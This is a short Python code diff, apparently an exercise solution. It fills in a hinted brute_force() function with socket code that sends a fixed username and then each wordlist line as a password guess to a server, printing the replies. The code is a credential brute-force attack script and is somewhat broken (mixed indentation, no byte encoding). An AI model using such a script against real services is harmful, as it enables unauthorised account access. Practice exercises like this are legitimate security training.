@@ -42,8 +42,25 @@ def brute_force():
             v0idcache's server.
     """
 
-    username = "OSINT"   # Hint: use OSINT
-    password = wordlist   # Hint: use wordlist
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port));
+
+    username = "v0idcache"   # Hint: use OSINT
+    password = ""
+    f = open(wordlist)
+
+    for line in f:
+		s.send(username)
+    	s.send(line)
+
+    	data = s.recv(1024)
+    	print(data)
+
+    f.close()
+
+    s.close()
+
+
 
 
 
